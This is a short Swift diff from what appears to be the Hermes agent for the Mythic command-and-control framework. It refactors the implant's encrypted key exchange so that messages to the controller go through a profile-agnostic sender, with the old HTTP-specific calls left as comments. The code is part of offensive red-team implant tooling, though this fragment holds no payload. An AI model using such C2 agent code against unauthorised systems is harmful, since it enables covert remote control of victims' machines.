@@ -76,7 +76,8 @@ func encryptedKeyExchange() -> Bool {
     ])
     
     // Send Hermes message, get Mythic response, decrypt and decode
-    var jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: payloadUUID, decodedAESKey: decodedAESKey, httpMethod: "get")
+    //var jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: payloadUUID, decodedAESKey: decodedAESKey, httpMethod: "get") - old HTTP-specific sendHermesMessage function, bypassing the C2 profile manager entirely. Fixed
+    var jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: payloadUUID, decodedAESKey: decodedAESKey)
     
     // Save tempUUID for checkin message
     let tempUUID = jsonResponse["uuid"].rawString()
@@ -111,7 +112,8 @@ func encryptedKeyExchange() -> Bool {
     agentConfig.payloadUUID = tempUUID!
     
     // Send Hermes message, get Mythic response, decrypt and decode
-    jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey.0, httpMethod: "post")
+    //jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey.0, httpMethod: "post") - old one, need profile-agnostic sendHermesMessage
+    jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey.0)
     
     // Returned UUID is new payloadUUID
     agentConfig.payloadUUID = jsonResponse["id"].rawString()!
